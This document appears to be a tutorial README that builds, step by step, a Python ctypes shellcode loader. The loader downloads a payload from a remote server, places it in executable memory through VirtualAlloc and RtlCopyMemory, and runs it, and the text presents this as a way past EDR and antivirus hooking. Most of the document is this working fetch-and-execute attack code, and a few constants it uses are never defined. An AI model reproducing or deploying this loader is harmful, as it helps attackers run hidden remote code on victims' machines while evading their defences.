# Windows API Calls

The Windows API, also known as WinAPI, is a set of functions that allow programs to interact with the underlying operating system. This script demonstrates how to utilize low-level Windows API calls to execute shellcode directly in memory, bypassing traditional methods of execution by avoiding hooking mechanisms used by EDR and Anti-Virus systems.

In this case, we use the `VirtualAlloc`, `VirtualProtect`, and `RtlCopyMemory` functions from the Windows `kernel32.dll` library to allocate memory, copy shellcode into it, adjust memory protection, and finally execute the shellcode.

## References

- [Windows API - Wikipedia](https://en.wikipedia.org/wiki/Windows_API)
- [VirtualAlloc Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
- [VirtualProtect Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [RtlCopyMemory Documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory)
- [CFUNCTYPE Documentation](https://docs.python.org/3/library/ctypes.html#ctypes.CFUNCTYPE)

## Building the Script

This script demonstrates how to fetch shellcode from a server, allocate memory, copy the shellcode into the allocated memory, set the memory protection, and finally execute the shellcode.

We begin by importing the necessary modules from the `ctypes` library, which allow us to interact with low-level Windows API functions.

```python
import requests
from ctypes import *
from ctypes import wintypes
```

Next, we define the argument types and return types for the Windows API functions that we will use:

```python
VirtualAlloc = windll.kernel32.VirtualAlloc
VirtualAlloc.argtypes = (
    wintypes.LPVOID,
    SIZE_T,
    wintypes.DWORD,
    wintypes.DWORD
)
VirtualAlloc.restype = wintypes.LPVOID

VirtualProtect = windll.kernel32.VirtualProtect
VirtualProtect.argtypes = (
    wintypes.LPVOID,
    SIZE_T,
    wintypes.DWORD,
    POINTER(wintypes.DWORD)
)
VirtualProtect.restype = wintypes.BOOL
```

- `argtypes`: Specifies the types of arguments that each function expects.
- `restype`: Specifies the return type of the function.

<br>

Now, we fetch the shellcode from the HTTP server.

```python
URL = "http://192.168.56.5:8000/shellcode"  # Change the URL to your own server

response = requests.get(URL)
shellcode = response.content
shellcode_length = len(shellcode)

print(f"Shellcode fetched: {shellcode_length} bytes.")
```

Here, we send a GET request to the server and retrieve the shellcode. The length of the shellcode is printed to confirm the size of the data.

<br>

Next, we allocate memory using `VirtualAlloc` with the required parameters.

```python
PAGE_SIZE = 4096
RegionSize = SIZE_T((shellcode_length + PAGE_SIZE - 1) // PAGE_SIZE * PAGE_SIZE)
AllocationType = MEM_COMMIT | MEM_RESERVE
PAGE_EXECUTE_READ_WRITE = 0x40

allocated_memory = VirtualAlloc(
    BaseAddress,
    RegionSize,
    AllocationType,
    PAGE_EXECUTE_READ_WRITE
)

if allocated_memory == 0:
    raise RuntimeError("VirtualAlloc failed. Memory allocation error.")

print(f"Memory allocated at -> {hex(allocated_memory)}")
```

We calculate the appropriate region size for the memory allocation, round it up to the nearest page size, and request memory using `MEM_COMMIT` and `MEM_RESERVE` flags. The memory protection is set to `PAGE_EXECUTE_READ_WRITE` to allow code execution.

<br>

After allocating memory, we copy the shellcode into the allocated memory region using `RtlCopyMemory`.

```python
shellcode_ptr = (c_char * shellcode_length).from_buffer_copy(shellcode)
RtlCopyMemory = windll.kernel32.RtlCopyMemory
RtlCopyMemory.argtypes = (wintypes.LPVOID, wintypes.LPCVOID, SIZE_T)
RtlCopyMemory.restype = None

RtlCopyMemory(
    allocated_memory,
    shellcode_ptr,
    shellcode_length
)

print("Shellcode copied to allocated memory.")
```

This step copies the shellcode into the allocated memory address.

<br>

We then update the memory protection using `VirtualProtect` to ensure that the allocated memory is marked as executable.

```python
NewProtect = PAGE_EXECUTE_READ_WRITE
OldProtect = wintypes.DWORD(0)

res = VirtualProtect(
    allocated_memory,
    RegionSize,
    NewProtect,
    byref(OldProtect)
)

if not res:
    raise RuntimeError("VirtualProtect failed. Memory protection error.")

print("Memory protection updated to PAGE_EXECUTE_READ_WRITE.")
```

This step is essential for ensuring that the shellcode can be executed from the allocated memory.

<br>

Finally, we define the shellcode function type and cast the allocated memory to a callable function:

```python
shellcode_func = CFUNCTYPE(None)
shellcode_callable = cast(allocated_memory, shellcode_func)

print("Executing shellcode...")
shellcode_callable()
```

The `CFUNCTYPE` defines a callable type, and we cast the allocated memory to this type to execute the shellcode.

## Example Output

![ss_demo](https://github.com/user-attachments/assets/00c635fa-e6d3-4449-b09a-f85001fb0982)
